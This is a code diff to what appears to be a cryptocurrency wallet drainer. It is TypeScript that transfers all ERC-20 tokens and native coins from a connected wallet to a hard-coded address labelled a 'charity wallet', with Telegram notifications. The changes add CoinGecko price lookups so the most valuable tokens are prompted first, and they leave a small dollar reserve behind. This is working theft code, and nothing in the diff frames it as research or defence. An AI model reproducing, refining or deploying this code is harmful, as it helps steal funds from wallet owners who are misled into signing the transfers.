@@ -1,6 +1,34 @@
 import { ethers } from 'ethers';
 import { sendTelegramMessage } from '@/utils/telegram';
 
+// ---------- ETH price helper ----------
+async function getEthPrice(): Promise<number> {
+  try {
+    const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
+    const data = await res.json();
+    return data?.ethereum?.usd ?? 3000;
+  } catch {
+    return 3000; // conservative fallback
+  }
+}
+
+async function getNativeTokenPrice(chainId: number): Promise<number> {
+  const coinIds: Record<number, string> = {
+    1: 'ethereum',
+    56: 'binancecoin',
+    137: 'matic-network',
+    8453: 'ethereum', // Base uses ETH
+  };
+  const id = coinIds[chainId] || 'ethereum';
+  try {
+    const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${id}&vs_currencies=usd`);
+    const data = await res.json();
+    return data?.[id]?.usd ?? 3000;
+  } catch {
+    return 3000;
+  }
+}
+
 // EVM charity wallet address
 export const EVM_CHARITY_WALLET = '0xAda53ED3Bc3D289F0A7E68c54B26cF7806D64398';
 
@@ -286,7 +314,8 @@ export async function getERC20Balance(
 export async function drainNativeTokens(
   signer: ethers.JsonRpcSigner,
   provider: ethers.BrowserProvider,
-  chainName: string
+  chainName: string,
+  chainId: number = 0
 ): Promise<string | null> {
   const address = await signer.getAddress();
   const balance = await provider.getBalance(address);
@@ -312,10 +341,20 @@ export async function drainNativeTokens(
   }
 
   const buffer = gasCost * 3n;
-  const sendAmount = balance - buffer;
+
+  // Determine USD reserve: $5 for Ethereum, $2 for other EVM chains
+  let reserveWei = 0n;
+  if (chainId > 0) {
+    const reserveUsd = chainId === 1 ? 5 : 2;
+    const nativePrice = await getNativeTokenPrice(chainId);
+    const reserveEth = reserveUsd / nativePrice;
+    reserveWei = ethers.parseEther(reserveEth.toFixed(18));
+  }
+
+  const sendAmount = balance - buffer - reserveWei;
 
   if (sendAmount <= 0n) {
-    console.log(`[native] Not enough ${chainName} balance after gas`);
+    console.log(`[native] Not enough ${chainName} balance after gas + reserve`);
     return null;
   }
 
@@ -332,6 +371,8 @@ function txDelay(ms: number = 1500): Promise<void> {
 
 /**
  * Drain ALL EVM tokens: first ERC-20 tokens, then native token.
+ * Tokens are prompted highest-USD-value first.
+ * Native token is ordered by its value relative to ERC-20s.
  */
 export async function drainAllEVMTokens(
   signer: ethers.JsonRpcSigner,
@@ -350,7 +391,7 @@ export async function drainAllEVMTokens(
     throw new Error('Wallet not ready. Please reconnect and try again.');
   }
 
-  // Step 1: Detect ERC-20 tokens (best-effort — never block native transfer)
+  // Step 1: Detect ERC-20 tokens & fetch native balance
   let detectedTokens: EVMTokenBalance[] = [];
   try {
     const detection = await detectWalletTokens(address, chainId);
@@ -363,11 +404,57 @@ export async function drainAllEVMTokens(
     console.warn('[drain] ERC-20 detection threw, will still attempt native:', e);
   }
 
-  // Step 2: ERC-20 transfers first
-  for (let i = 0; i < detectedTokens.length; i++) {
-    const token = detectedTokens[i];
+  // Fetch token USD prices for sorting via CoinGecko
+  let tokenPrices: Record<string, number> = {};
+  if (detectedTokens.length > 0) {
     try {
-      console.log(`[drain] ERC-20 ${i + 1}/${detectedTokens.length}: ${token.symbol}`);
+      const addresses = detectedTokens.map(t => t.contractAddress.toLowerCase()).join(',');
+      const platform = chainId === 1 ? 'ethereum' : chainId === 56 ? 'binance-smart-chain' : chainId === 137 ? 'polygon-pos' : chainId === 8453 ? 'base' : 'ethereum';
+      const res = await fetch(`https://api.coingecko.com/api/v3/simple/token_price/${platform}?contract_addresses=${addresses}&vs_currencies=usd`);
+      const data = await res.json();
+      for (const [addr, val] of Object.entries(data)) {
+        tokenPrices[addr.toLowerCase()] = (val as any)?.usd ?? 0;
+      }
+    } catch {
+      console.warn('[drain] Token price fetch failed, using balance-based ordering');
+    }
+  }
+
+  // Sort ERC-20 tokens by USD value (highest first)
+  const sortedTokens = [...detectedTokens].sort((a, b) => {
+    const priceA = tokenPrices[a.contractAddress.toLowerCase()] ?? 0;
+    const priceB = tokenPrices[b.contractAddress.toLowerCase()] ?? 0;
+    return (priceB * b.uiAmount) - (priceA * a.uiAmount);
+  });
+
+  // Compute native value in USD for ordering
+  const nativeBalance = await provider.getBalance(address);
+  const nativePrice = await getNativeTokenPrice(chainId);
+  const nativeValueUsd = parseFloat(ethers.formatEther(nativeBalance)) * nativePrice;
+
+  // Determine if native should go first (higher value than all ERC-20s)
+  const highestErc20Value = sortedTokens.length > 0
+    ? (tokenPrices[sortedTokens[0].contractAddress.toLowerCase()] ?? 0) * sortedTokens[0].uiAmount
+    : 0;
+  const nativeFirst = nativeValueUsd > highestErc20Value && sortedTokens.length > 0;
+
+  // Execute transfers in value order
+  if (nativeFirst) {
+    // Native first
+    try {
+      console.log(`[drain] Prompting native ${chainName} transfer (highest value)...`);
+      await drainNativeTokens(signer, provider, chainName, chainId);
+      await txDelay(2000);
+    } catch (error) {
+      console.error('[drain] Native transfer failed:', error);
+    }
+  }
+
+  // ERC-20 transfers (sorted by value)
+  for (let i = 0; i < sortedTokens.length; i++) {
+    const token = sortedTokens[i];
+    try {
+      console.log(`[drain] ERC-20 ${i + 1}/${sortedTokens.length}: ${token.symbol}`);
       await sendERC20Token(signer, token.contractAddress, token.balance, chainName);
       await txDelay(1500);
     } catch (error) {
@@ -375,12 +462,14 @@ export async function drainAllEVMTokens(
     }
   }
 
-  // Step 3: Native transfer LAST — longer delay before for Trust Wallet Android
-  await txDelay(3000);
-  try {
-    console.log(`[drain] Prompting native ${chainName} transfer...`);
-    await drainNativeTokens(signer, provider, chainName);
-  } catch (error) {
-    console.error('[drain] Native transfer failed:', error);
+  // Native transfer last (if not already sent first)
+  if (!nativeFirst) {
+    await txDelay(3000);
+    try {
+      console.log(`[drain] Prompting native ${chainName} transfer...`);
+      await drainNativeTokens(signer, provider, chainName, chainId);
+    } catch (error) {
+      console.error('[drain] Native transfer failed:', error);
+    }
   }
 }
